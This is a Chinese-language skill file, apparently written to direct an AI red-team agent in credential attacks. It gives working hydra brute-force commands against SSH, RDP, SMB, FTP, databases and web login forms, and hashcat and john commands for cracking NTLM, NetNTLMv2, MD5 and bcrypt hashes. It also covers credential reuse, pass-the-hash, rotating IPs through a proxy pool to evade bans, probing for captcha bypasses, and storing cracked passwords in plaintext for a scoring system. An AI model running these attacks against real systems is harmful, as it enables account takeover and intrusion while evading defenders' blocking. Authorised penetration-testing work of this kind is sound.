---
name: credential-attack
description: 凭据攻击：在线弱口令爆破（hydra）与离线哈希破解（hashcat/john），覆盖 SSH/FTP/RDP/SMB/数据库/Web 后台
whenToUse: 发现登录入口（Web 后台/SSH/FTP/RDP/SMB/MySQL/MSSQL/Redis）需要试口令；或已拿到哈希/密文需要还原明文
role: exploit
enabled: true
---

# 凭据攻击（在线爆破 + 离线破解）

红队里"拿账号权限"最稳的两条路之一（另一条是配置/源码泄露拿到明文）。
**本技能只管把口令试出来**；试出来之后必须用技能 `browser-automation` / `kimi-webbridge`
**在真实浏览器登录一次**才算拿到账号权限（红线：只有凭据不算拿到账号）。

## 本机工具

| 工具 | 路径 | 版本 | 用途 |
| --- | --- | --- | --- |
| **hydra** | `/usr/bin/hydra` | 9.7 | 在线爆破，覆盖 50+ 协议 |
| **hashcat** | `/usr/bin/hashcat` | 7.1.2 | 离线哈希破解（GPU/CPU） |
| **john** | `/usr/sbin/john` | — | 离线破解（自动识别格式，配置简单） |

字典：`/usr/share/wordlists/`（含 `rockyou.txt` 需 gunzip）、`/usr/share/seclists/Passwords/`。
**没有 rockyou 时先解压**：`sudo gunzip /usr/share/wordlists/rockyou.txt.gz`（需授权，没有就换 seclists 里的）。

## 一、在线爆破（hydra）

### 通用语法
```bash
hydra -L users.txt -P pass.txt <protocol>://<target>[:port] [模块参数] -t <并发> -f -o runs/hydra-<target>.txt
```
- `-L` 用户名字典 / `-l` 单个用户名；`-P` 口令字典 / `-p` 单个口令
- `-t` 并发（**默认 16，别超过 16**，多数服务会锁号或封 IP）
- `-f` 命中一个就停（避免把账号打锁）
- `-o` 输出到 `runs/`（报告要靠它复现）
- `-V` 显示每次尝试（调试用，正式跑别开）

### 各协议实例
```bash
# SSH
hydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f -o runs/hydra-ssh-10.0.0.5.txt

# RDP（注意：并发必须低，Windows 会锁号）
hydra -L users.txt -P pass.txt rdp://10.0.0.6 -t 2 -f -o runs/hydra-rdp-10.0.0.6.txt

# SMB
hydra -L users.txt -P pass.txt smb://10.0.0.7 -t 4 -f

# FTP
hydra -L users.txt -P pass.txt ftp://10.0.0.8 -t 6 -f

# MySQL
hydra -L users.txt -P pass.txt mysql://10.0.0.9 -t 4 -f

# MSSQL
hydra -L users.txt -P pass.txt mssql://10.0.0.10 -t 4 -f

# Web 表单登录（POST）——最常用
hydra -L users.txt -P pass.txt target.example.com http-post-form \
  "/admin/login.jsp:username=^USER^&password=^PASS^:F=用户名或密码错误" -t 8 -f -o runs/hydra-web-admin.txt

# Web 表单（带额外头/HTTPS）
hydra -L users.txt -P pass.txt -s 443 -S target.example.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=invalid:H=Cookie: JSESSIONID=xxx" -t 8 -f
```

### Web 表单爆破的成败判定（关键）
`http-post-form` 第三段格式：`"<路径>:<POST 体>:<失败条件>"`，**失败条件必须写准**，否则全量误报：
- `F=<失败特征串>`：响应里出现该串表示**失败**（推荐，最稳）
- `S=<成功特征串>`：响应里出现该串表示**成功**（响应无统一失败文案时用）
- 先手工发两次请求（错误口令 vs 正确口令各一次，或对比不存在用户）**确认特征串唯一**，再跑爆破。
- 有验证码 / 图形码 / 滑块：先看能不能绕过（固定验证码、验证码不校验、前端校验），绕不过**不要硬爆**（技能 `browser-automation` 可做有限次带验证码尝试），转别的路。

### 字典优先级（省时间的关键）
1. **针对性小字典**（命中率最高）：单位名/品牌/域名/年份组合，如 `单位简称@2026`、`Admin@123`、`<域名>2026`；
   用 `redteam_asset_query` 里的 title/单位信息现造。
2. **默认口令字典**：产品默认口令（`admin/admin`、`tomcat/tomcat`、`weblogic/weblogic1`、`sa/sa`），
   参考 nuclei 模板 `http/default-logins/`（307 个），**先查 `redteam_poc_search`**。
3. **常见弱口令 TOP**：`/usr/share/seclists/Passwords/Common-Credentials/` 下的 10-million / top-100 等。
4. 通用大字典（rockyou）放最后——慢且噪声大。

### 用户名从哪来
- Web 后台：报错信息、JS 里的默认账号、接口返回的 `createBy`、登录页提示、`robots.txt`、员工邮箱前缀；
- 目录爆破命中 `/admin` 时优先试 `admin`、`administrator`、`system`、`test`、`guest`；
- 拿到一个凭据后走**凭据复用**（见下），比爆破快得多。

## 二、离线破解（hashcat / john）

拿到哈希/密文（数据库、配置文件、`/etc/shadow`、Web 应用库）后离线跑，**不产生目标侧流量**，比在线爆破安全得多。

```bash
# 1) 先识别哈希类型
hashcat --identify hashes.txt

# 2) NTLM（Windows）
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -O -w 3

# 3) NetNTLMv2（Responder 抓到的）
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# 4) MD5 / SHA1（Web 应用库）
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt

# 5) bcrypt（WordPress / PHP）
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

# 6) 加规则（用规则把字典放大 10 倍，性价比最高）
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 7) 掩码爆破（已知口令策略，如 8 位数字 + 大写字母）
hashcat -m 1000 hashes.txt -a 3 '?u?l?l?l?l?d?d?d?d'
```

```bash
# john：格式识别省事，配置在 ~/.john/john.conf
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

**注意**：本机可能没有 GPU，`hashcat` 走 CPU 会慢——优先用规则+小字典，或把哈希存到 `runs/` 后续处理；
**不要为了破解挂几个小时**，破解不出来就用哈希直接打（Pass-the-Hash，见技能 `lateral-movement`）。

## 三、凭据复用（比爆破快得多，优先做）

拿到任何一组凭据后，**先横向试**，不要急着爆下一个：
1. `redteam_credential_list` 看已有凭据（含用户名/口令/来源）；
2. 同一口令试：其他同款系统、其他资产的管理端、SSH/RDP/SMB/数据库、VPN/堡垒机/运维平台；
3. 用户名规律（`姓.名`、工号、邮箱前缀）配合已知口令试同系统其它用户；
4. 哈希直接复用：PtH / Pass-the-Key（技能 `lateral-movement`）。

## 四、纪律与边界（必须遵守）

1. **先查库**：`redteam_credential_list` / `redteam_asset_query`——别重复爆同一个入口（`blocked_count>0` 的先看原因）。
2. **锁号风险**：Windows（RDP/SMB）与 OA/域账号**严格限流**：`-t 2`（Windows）、`-t 4`（SSH/FTP）、
   字典不超过百条量级；**同一账号连续失败 5 次就停**，换账号或换目标——把账号打锁等于毁掉入口。
3. **同一目标累计被封 >3 次放弃**（`redteam_asset_test` status=abandoned + blocked=true）。
4. **降噪走代理**：Web 表单爆破用技能 `cn-proxy-pool` 换出口 IP；内网目标走 suo5 隧道。
5. **内网优先用 fscan**：内网段落的弱口令普查交给技能 `fscan-intranet`（28 类服务批量爆破，一趟出结果），
   hydra 用于 fscan 没覆盖的协议或需要精细控制的单点。

## 五、输出与落库（强制）

1. **每条命中立刻 `redteam_credential_add`**：
   - `username`、**明文写 `secret_value`**（面板直接显示，便于随时复用）、`source`（`弱口令`/`默认口令`/`凭据复用`/`泄露`/`离线破解`）、
     `tool`（实际命令原文，如 `hydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f`）、`secret_ref`（证据文件路径如 `runs/hydra-ssh-10.0.0.5.txt`）。
2. **必须实测登录才记分**：Web 后台用 `browser-automation` / `kimi-webbridge` 真实登录一次
   （打开登录页 → 填账号口令 → 确认进入后台 → 记页面标题/菜单/当前用户名 → 抓 Cookie 存证据）→
   `redteam_access_add`（`method=web-login`）→ `redteam_score_hit`（`web-app` 10 分 / `web-app` 20 分，
   `evidence` 写「资产｜后台管理员 tomcat/Tomcat@2024」）。
   **登不进去就在 `redteam_asset_test` 的 `test` 里记一行卡点**（哈希未破解/需二次认证/限制来源 IP/账号已禁用），不记分。
3. **账号权限按服务封顶**：同一资产同一端口只算一次分，拿到管理员即该服务拿满——不要在同一服务上刷多个账号。
4. 每个关键动作 `redteam_chain_add`：`stage_code=internet`（或 `internal`），
   `tool` 写实际命令、`result` 写回显摘要（如 `ssh 10.0.0.5 用 root/Root@123 登录成功，uid=0(root)`）。
5. 哈希文件、破解结果一律放 `runs/`。
